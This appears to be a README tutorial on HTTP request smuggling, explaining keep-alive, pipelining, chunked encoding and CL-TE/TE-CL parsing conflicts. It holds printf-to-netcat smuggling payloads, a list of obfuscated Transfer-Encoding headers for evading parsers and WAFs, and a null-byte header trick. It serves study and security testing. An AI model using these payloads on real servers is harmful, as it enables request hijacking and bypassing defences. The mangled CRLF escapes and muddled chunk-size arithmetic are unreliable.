# HTTP-Smuggling 
![20191205171217](https://user-images.githubusercontent.com/25066959/70326865-8d21ea00-1803-11ea-8362-e9a51d7937d2.jpeg)    

### Inspiration: In Defcon 27 in 2019, @James Kettle proposed HTTP Desync Attacks: Smashing into the Cell Next Door ), explaining how to use PayPal's vulnerabilities to be discovered using HTTP Smuggling technology.           

#### Things we need to understand to understand this attack go over Transfer encoding, Message Body, Pipelining.

### Quick what this attack vector about?
The HTTP Smuggling attack is based on the inconsistency between the reverse proxy and the backend server in parsing and processing HTTP requests. Using this difference, we can “embed” another HTTP request in order to achieve our purpose of “smuggling” the request. It directly shows that we can access intranet services or cause some other attacks.    

Kinda how it works:   
Each time a client makes an HTTP request it needs to establish a TCP connection with the server. Essentially we need to obtain the content of a web page, not only requested HTML documents but also various resources like Images, JS, CSS. The load overhead is so great actually that this is the reason `Keep-Alive` and `Pipeline` was introduced in HTTP 1.1.     

#### Keep-Alive
http/1.1 `Keep-Alive` allows multiple requests and responses to be hosted on a single connection. The HTTP request tells the server after receiving the HTTP request not to close the TCP connection and reuse this TCP connection. this essentially reduces TCP handshakes and server overhead. that being said, `Connection: close` will interrupt the TCP connection after the communication is completed.    

#### Pipeline 
After you have `Keep-Alive`, there will be follow-up Pipeline. Here, the client can send its own HTTP request without waiting for the response from the server. After receiving the request from the server, it follows a FIFO mechanism to send the request. This corresponds strictly to the response, sent to the client. Today, browsers are not enabled Pipeline by default, but general servers provide Pipleline support for them.    

![electrical-electronic-systems-HTTP-with-without-pipelining-5-193-g002](https://user-images.githubusercontent.com/25066959/70337810-c7968180-1819-11ea-82a1-ee8a395f3ba5.png)

We can clearly see that after using the pipeline, there is no need to wait for the previous request to complete its response before processing the second request. This is a bit of asynchronous processing.

#### Message Body
https://tools.ietf.org/html/rfc7230#section-3.3   
This is used to carry the entity-body associated with the request / response. It's different from the message-body. If you don't know what this is just read the RFC above 

#### Transfer-Encoding
This is pretty much the same as the content-transfer-encoding field of the MIME (Multipurpose Internet Mail Extensions) which is used to enable safe transport of binary data over a 7-bit transport service. In HTTP's case, Transfer-Encoding is primarily intended to accurately delimit a dynamically generated payload. And to distinguish payload encodings that are only applied for transport efficiency or security from those that are characteristics of the selected resource.     
You’ll find in the link below the list of several attributes. 
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding    

For HTTP-Hijacking we focus on `chunked transfer encoding` it's not the first time this vector is used in attacks… you can also use this field to bypass some of the WAF which is also an interesting bypass technique.     

Regardless refer to this RFC to learn more about `Chunked Transfer Coding` https://tools.ietf.org/html/rfc7230#section-4.1    

All we need to understand is it's structure. Also refer to wikipedia https://en.wikipedia.org/wiki/Chunked_transfer_encoding. So for example if we want to use chunked to send the following message 

`Buzzwords in \ r \ n \ r \ n chunks.`   
We can send it like this:
 ```
POSTT / xxx HTTP / 1.1
Host : xxx
Content-Type : text / plain
Transfer-Encoding : chunked

7 \ r \ n
Buzz \ r \ n
8 \ r \ n
words \ r \ n
e \ r \ n
in \ r \ n \ r \ nchunks. \ R \ n
0 \ r \ n
\ r \ n
```
For a brief explanation, we use `\r\n` (CRLF injection (look it up)) , so here `\r\n`  are two bytes ; the first number 4 indicates that there will be 4 bytes of data, which is the 4 letters of Buzz, and then according to RFC The document standard, the letter Buzz part needs to be followed by the` \r\n` chunk-data part, the number 4 needs to be followed by the `\r\n` chunk-size part, and the number is a hexadecimal number, such as the third data.    

```
e \ r \ n
in \ r \ n \ r \ n chunks. \ r \ n
```
Here among the first space data is present `\r\n` count of two characters, the last `\r\n` data representing the end, this is the case, a first space in bytes + 2 bytes + 2 `\r\n` count 4 bytes + chunks. 7 Bytes = 14 bytes. The hexadecimal representation is 14 which is e.
The last one `0\r\n\r\n` indicates the end of the chunk section.
#### So what? 
In itself, these things are not harmful, and they are used to increase the network transmission rate in various ways, but in some special cases, some corresponding security problems will occur.    

So reverse proxy and back-end server will not use pipeline technology, or even keep-alive. Which sucks for us attackers. The measures taken by the reverse proxy is to reuse the TCP connection, because for the reverse proxy and back-end server IPs are relatively fixed, and requests from different users establishing a link with the back-end server through the proxy server, and it is logical to reuse the TCP link between the two. Isn't really a thing?    

![Capture](https://user-images.githubusercontent.com/25066959/70369350-e6326200-1885-11ea-9549-fdabe27a7917.PNG)   

![Capture](https://user-images.githubusercontent.com/25066959/70369415-00207480-1887-11ea-9b6c-427b16f6a648.PNG)

So smuggling 
![Capture](https://user-images.githubusercontent.com/25066959/70369423-17f7f880-1887-11ea-9222-8346c4ad43f8.PNG)

Therefore. When we send a vague HTTP request to the proxy server, the proxy server may consider this to be an HTTP request, and then forward it to the backend origin server, but the origin server After parsing and processing, only a part of it is considered as a normal request is ‘accepted’ but this includes the remaining part smuggled request. When this part affects the request of a normal user, an HTTP smuggling attack is implemented.

## The Attack

Methodology: We know that both Content-Length and Transfer-Encoding can be used 
as a way to process the body when transmitting POST data.    
 
Some readers may see that this will have the same confusion as me. Is the RFC document not standardized for CL & TE parsing priorities? Yes, yes, see https://tools.ietf.org/html/rfc7230#section-3.3.3    

Terms we’ll be using:
`CL-TE` means that Front uses Content-Length first, and Backend gives priority to Transfer-Encoding.   
`TE-CL` means that Front will give priority to Transfer-Encoding, and Backend will give priority to Content-Length.    

In addition, Front represents a typical front-end server such as a reverse proxy, and Backend represents a back-end business server that processes requests. In the following \r\n, CRLF is replaced by two bytes.

### Chunks Priority On Content-Length

	
```
printf 'GET / HTTP / 1.1 \ r \ n' \
'Host: localhost \ r \ n' \
'Content-length: 56 \ r \ n' \
'Transfer-Encoding: chunked \ r \ n' \
'Dummy: Header \ r \ n \ r \ n ' \
' 0 \ r \ n ' \
' \ r \ n ' \
' GET / tmp HTTP / 1.1 \ r \ n ' \
' Host: localhost \ r \ n ' \
' Dummy: Header \ r \ n ' \
' \ r \ n ' \
' GET / tests HTTP / 1.1 \ r \ n ' \
' Host: localhost \ r \ n ' \
' Dummy: Header \ r \ n ' \
' \ r \ n ' \
| nc -q3 127.0.0.1 8080
```   
The above correct resolution should be resolved into three requests:    
```
GET / HTTP / 1.1
Host: localhost
Content-length: 56
Transfer-Encoding : chunked
Dummy: Header

0
``` 
```
GET / tmp HTTP / 1.1
Host: localhost
Dummy: Header
```
```
GET / tests HTTP / 1.1
Host: localhost
Dummy: Header
```
If there is a TE & CL priority problem, it will be parsed into two requests:    
```
GET / HTTP / 1.1 [CRLF]
Host: localhost [CRLF]
Content-length: 56 [CRLF]
Transfer-Encoding : chunked [CRLF] (ignored and removed, hopefully)
Dummy: Header [CRLF]
[CRLF]
0 [CRLF] (start of 56 bytes of body)
[CRLF]
GET / tmp HTTP / 1.1 [CRLF]
Host: localhost [CRLF]
Dummy: Header [CRLF] (end of 56 bytes of body, not parsed)
```
```
GET / tests HTTP / 1.1
Host: localhost
Dummy: Header
```

### Bad Chunked Transmission
https://tools.ietf.org/html/rfc7230#section-3.3.3 as you can see In other words Transfer-Encoding: chunked, zorg, it should return a 400 error when it is received .    

This type can be bypassed a lot, such as:
```
Transfer-Encoding : xchunked

Transfer-Encoding: chunked

Transfer-Encoding : chunked

Transfer-Encoding : x

Transfer-Encoding: [tab] chunked

GET / HTTP / 1.1 Transfer-Encoding : chunked X : X [\ n] Transfer-Encoding: chunked
 


Transfer-Encoding
 : chunked
```

### Null in Headers 
This problem is more likely to occur in some middleware servers written in C, because the `\0` end of string symbol is used in the header. If we use `\0` it , it may cause the middleware to parse abnormally. because of newlines...     

For example:
```
# 2 responses instead of 3 (2nd query is wipped out by pound, used as a body) 
printf  'GET / HTTP / 1.1 \ r \ n' \ 
'Host: localhost \ r \ n' \ 
'Content- \ 0dummy: foo \ r \ n ' \ 
' length: 56 \ r \ n ' \ 
' Transfer-Encoding: chunked \ r \ n ' \ 
' Dummy: Header \ r \ n ' \ 
' \ r \ n ' \ 
' 0 \ r \ n ' \ 
' \ r \ n ' \ 
' GET / tmp HTTP / 1.1 \ r \ n ' \ 
' Host: localhost \ r \ n ' \ 
' Dummy: Header \ r \ n ' \ 
' \ r \ n ' \ 
'GET / tests HTTP / 1.1 \ r \ n' \ 
'Host: localhost \ r \ n'\ 
'Dummy: Header \ r \ n' \ 
'\ r \ n' \
| nc -q3 127.0.0.1 8080
```
